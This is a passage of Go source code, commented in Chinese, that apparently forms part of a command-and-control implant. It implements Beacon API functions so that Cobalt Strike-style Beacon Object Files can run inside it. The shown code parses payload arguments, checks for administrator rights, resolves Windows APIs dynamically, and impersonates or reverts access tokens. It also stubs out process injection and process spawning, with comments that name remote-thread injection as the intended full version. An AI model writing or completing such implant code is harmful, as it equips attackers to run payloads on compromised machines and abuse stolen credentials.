	remaining := len(beaconState.buffer) - beaconState.pos
	if remaining < 0 {
		remaining = 0
	}
	return uintptr(remaining)
}

// BeaconDataExtract(char** parser, int* size) -> char*
// 从解析器中提取可变长度数据（先读4字节长度，再读数据）
func beaconAPIDataExtract(parserPtr uintptr, sizePtr uintptr) uintptr {
	beaconState.mu.Lock()
	defer beaconState.mu.Unlock()

	if beaconState.buffer == nil || beaconState.pos+4 > len(beaconState.buffer) {
		return 0
	}

	extractLen := int(binary.LittleEndian.Uint32(beaconState.buffer[beaconState.pos:]))
	beaconState.pos += 4

	if extractLen <= 0 || beaconState.pos+extractLen > len(beaconState.buffer) {
		return 0
	}

	// 返回数据指针（C 风格的指针算术，BOF 期望可读写内存）
	extractedData := beaconState.buffer[beaconState.pos : beaconState.pos+extractLen]
	beaconState.pos += extractLen

	// 写入 size 输出参数
	if sizePtr != 0 {
		*(*int32)(unsafe.Pointer(sizePtr)) = int32(extractLen)
	}

	return uintptr(unsafe.Pointer(&extractedData[0]))
}

// BeaconIsAdmin() -> BOOL
func beaconAPIIsAdmin() uintptr {
	var sid *windows.SID
	err := windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY, 2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0, &sid)
	if err != nil {
		return 0
	}
	defer windows.FreeSid(sid)

	var token windows.Token
	err = windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &token)
	if err != nil {
		return 0
	}
	defer token.Close()

	// CheckTokenMembership via advapi32 (x/sys/windows lacks direct binding)
	var isMember int32
	procCheckTokenMembership := resolveAPI("advapi32.dll", "CheckTokenMembership")
	r1, _, _ := procCheckTokenMembership.Call(uintptr(token), uintptr(unsafe.Pointer(sid)), uintptr(unsafe.Pointer(&isMember)))
	if r1 == 0 || isMember == 0 {
		return 0
	}
	return 1
}

// BeaconGetProcAddress(HMODULE module, char* procName) -> FARPROC
func beaconAPIGetProcAddress(module uintptr, procName uintptr) uintptr {
	name := cString(procName)
	if name == "" {
		return 0
	}
	// If module is 0, try loading the function from common DLLs
	if module == 0 {
		return resolveWindowsAPI(name)
	}
	proc, err := windows.GetProcAddress(windows.Handle(module), name)
	if err != nil {
		return 0
	}
	return proc
}

// BeaconGetModuleHandle(char* moduleName) -> HMODULE
func beaconAPIGetModuleHandle(moduleName uintptr) uintptr {
	name := cString(moduleName)
	if name == "" {
		return 0
	}
	// Try LoadLibrary first (for DLLs not yet loaded), then GetModuleHandleA
	h, err := windows.LoadLibrary(name)
	if err == nil {
		return uintptr(h)
	}
	// GetModuleHandleA via kernel32 (not exported by x/sys/windows)
	getMod := resolveAPI("kernel32.dll", "GetModuleHandleA")
	an, _ := windows.BytePtrFromString(name)
	h2, _, _ := getMod.Call(uintptr(unsafe.Pointer(an)))
	if h2 != 0 {
		return h2
	}
	return 0
}

// ─── Additional Beacon APIs ────────────────────────────────────────────────

// BeaconInjectProcess(HANDLE hProcess, LPVOID baseAddr, DWORD dataLen, DWORD entryOffset, char* args, int argLen)
// 将 BOF 注入到指定进程（简化实现：返回 0 表示不支持）
func beaconAPIInjectProcess(hProcess, baseAddr, dataLen, entryOffset, args, argLen uintptr) uintptr {
	// 完整实现需要：重复 BOF 在目标进程中的内存复制 + CreateRemoteThread
	// 目前回退：在当前进程中执行（兼容简单 BOF）
	beaconOutput.WriteString("[!] BeaconInjectProcess not fully implemented - executing in current process\n")
	return 0
}

// BeaconInjectTemporaryProcess(...)
func beaconAPIInjectTemporaryProcess(a1, a2, a3, a4, a5 uintptr) uintptr {
	beaconOutput.WriteString("[!] BeaconInjectTemporaryProcess not implemented\n")
	return 0
}

// BeaconSpawnTemporaryProcess(DWORD x86, BOOL ignoreToken, STARTUPINFO* si, int siLen, char* cmdline, int cmdlineLen)
// 注：STARTUPINFO 长度为 uintptr，cmdline 为字符串指针+长度
func beaconAPISpawnTemporaryProcess(x86, ignoreToken, siPtr, siLen, cmdlinePtr, cmdlineLen uintptr) uintptr {
	// 简化：不支持临时进程生成
	beaconOutput.WriteString("[!] BeaconSpawnTemporaryProcess not implemented\n")
	return 0
}

// BeaconUseToken(HANDLE token)
func beaconAPIUseToken(tokenHandle uintptr) uintptr {
	beaconImpersonated = true
	// 尝试模拟令牌
	impersonate := resolveAPI("advapi32.dll", "ImpersonateLoggedOnUser")
	r, _, _ := impersonate.Call(tokenHandle)
	if r == 0 {
		return 0
	}
	return 1
}

// BeaconRevertToken()
func beaconAPIRevertToken() uintptr {
	beaconImpersonated = false
	revert := resolveAPI("advapi32.dll", "RevertToSelf")
	r, _, _ := revert.Call()
	return r
}

// ─── Utility ────────────────────────────────────────────────────────────────

func cString(ptr uintptr) string {
	if ptr == 0 {
		return ""
	}
	var buf []byte
	for i := 0; ; i++ {
		b := *(*byte)(unsafe.Pointer(ptr + uintptr(i)))
		if b == 0 {
			break
		}
		buf = append(buf, b)
	}
	return string(buf)
}
